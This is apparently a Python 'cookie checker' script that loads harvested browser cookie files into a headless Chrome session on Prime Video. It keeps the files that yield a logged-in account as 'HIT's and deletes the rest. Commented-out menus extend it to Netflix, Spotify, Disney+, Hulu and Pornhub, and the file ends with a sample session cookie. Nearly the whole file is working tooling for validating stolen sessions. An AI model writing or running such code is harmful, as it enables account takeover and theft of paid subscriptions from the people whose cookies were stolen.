from selenium import webdriver
import json
import os
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import pyautogui



# g = pyautogui.password(text='enter password', title='MSTrock', default='', mask='*')
 

# if g != "waster123":
#     pyautogui.alert(text='Invalid password', title='error', button='OK')


print("""



███╗░░░███╗░██████╗████████╗██████╗░░█████╗░░█████╗░██╗░░██╗  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
████╗░████║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║░██╔╝  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
██╔████╔██║╚█████╗░░░░██║░░░██████╔╝██║░░██║██║░░╚═╝█████═╝░  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
██║╚██╔╝██║░╚═══██╗░░░██║░░░██╔══██╗██║░░██║██║░░██╗██╔═██╗░  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
██║░╚═╝░██║██████╔╝░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░░░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝




	""")

# print(f"{Fore.RED }1 - cookie checker		{Style.RESET_ALL}!")
# print(f"{Fore.RED }1 - cookie gen			{Style.RESET_ALL}")
# print("")
# gf = input("->")
# print("")
# if gf == "1":
# 	print(f"{Fore.RED }1 - netflix     {Style.RESET_ALL}")
# 	print(f"{Fore.RED }2 - spotify      {Style.RESET_ALL}")
# 	print(f"{Fore.RED }3 - disney+      {Style.RESET_ALL}")
# 	print(f"{Fore.RED }4 - pornhub       {Style.RESET_ALL}")
# 	print(f"{Fore.RED }5 - hulu{Style.RESET_ALL}")
# 	print("")
# 	gf = input("->")
# 	if gf == "1":
# 		pass


colorama_init()
op = webdriver.ChromeOptions()
op.add_argument('headless')
op.add_argument('--log-level=3')
driver = webdriver.Chrome(options=op)


#     quit()
# kkk
# Set the path to your ChromeDriver executable
chrome_driver_path = '/path/to/chromedriver'

def make(r):
	cookiee = []


	for line in r.splitlines():
		fields = line.strip().split("\t")
		# print(fields)
		if len(fields) >= 7:
			cookie = {
	                "domain": fields[0].replace("www", ""),
	                "flag": fields[1],
	                "path": fields[2],
	                "secure": fields[3] == "TRUE",
	                "expiration": fields[4],
	                "name": fields[5],
	                "value": fields[6]}
			# print(cookie)
			cookiee.append(cookie)
	return cookiee



for filename in os.listdir("pathhh"):
	filepath = os.path.join("pathhh", filename)
	# print(filepath)
	if os.path.isfile(filepath):
		with open(filepath, "r", encoding="utf-8") as file:
			content = file.read()
			# print(content)
			# print("checking..")
			gg = make(content)

			


			mg = driver.get("https://www.primevideo.com/")

			# gg = make(content)
			try:

				for cookie in gg:
					try:
						driver.add_cookie(cookie)
					except:
						continue
					# print("done")

				driver.refresh()
				url =  driver.current_url
				# print(url)    
				if "nonprimehomepage" not in str(url):
					region = url.split("/")[4]
					# print(region)
					with open(f"working2/[{region}] {filename}-nn.txt", "w", encoding="utf-8") as f:
						f.write(content)
						# print(gg)
						print(f"{Fore.GREEN}[+]HIT {filename} - DONE!{Style.RESET_ALL}!")

				else:
					print(f"{Fore.RED}[-]INVALID {filename} {Style.RESET_ALL}!")
					print("") 
			except:
				print(f"{Fore.RED}[-]ERROR {filename} {Style.RESET_ALL}!")
		os.remove(filepath)



# Create a new instance of the Chrome driver

# driver.add_cookie({"domain":".netflix.com","path":"/","name":"memclid","value":"8eaaebb5-cab5-405c-a495-8ada9e3db3ad"})
